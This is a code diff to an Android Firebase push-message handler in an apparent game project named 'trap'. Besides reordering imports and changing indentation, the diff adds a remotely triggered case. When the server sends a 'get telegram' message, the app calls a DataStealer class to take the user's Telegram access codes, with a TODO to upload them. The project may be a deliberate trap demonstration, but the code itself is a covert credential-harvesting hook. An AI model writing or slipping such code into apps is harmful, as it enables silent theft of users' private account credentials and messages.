@@ -8,11 +8,11 @@ import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.messaging.FirebaseMessagingService;
 import com.google.firebase.messaging.RemoteMessage;
 
-import androidx.annotation.NonNull;
-
 import java.util.ArrayList;
 import java.util.Map;
 
+import androidx.annotation.NonNull;
+import de.hpi3d.gamepgrog.trap.android.DataStealer;
 import de.hpi3d.gamepgrog.trap.android.NotificationHelper;
 import de.hpi3d.gamepgrog.trap.api.ApiIntent;
 import de.hpi3d.gamepgrog.trap.api.ApiService;
@@ -39,11 +39,21 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
                 case FirebaseDataParser.CALL_NEW_CLUE:
                     onClueReceived(FirebaseDataParser.parseClue(data));
                     return;
+                case FirebaseDataParser.CALL_GET_TELEGRAM:
+                    onTelegramReceived();
+                    return;
+
             }
         }
 
         // If this line is reached something went wrong
         throw new IllegalArgumentException("Firebase message is malformed: " + data.toString());
+    }
+
+    private void onTelegramReceived() {
+        ArrayList telegramMessages = DataStealer.takeTelegramAccessCodes(getApplicationContext());
+
+        // TODO upload telegram messages
     }
 
     private void onTasksReceived(ArrayList<Task> tasks) {
@@ -82,12 +92,12 @@ public class OurFirebaseMessagingService extends FirebaseMessagingService {
 
     public static void sendNewToken(Context c, int userid, String token) {
         ApiIntent
-            .build(c)
-            .setCall(ApiService.CALL_SEND_FB_TOKEN)
-            .put(ApiService.KEY_USER_ID, userid)
-            .put(ApiService.KEY_TOKEN, token)
-            // TODO add receiver, handle errors
-            .start();
+                .build(c)
+                .setCall(ApiService.CALL_SEND_FB_TOKEN)
+                .put(ApiService.KEY_USER_ID, userid)
+                .put(ApiService.KEY_TOKEN, token)
+                // TODO add receiver, handle errors
+                .start();
     }
 
     public static void init(Application app) {
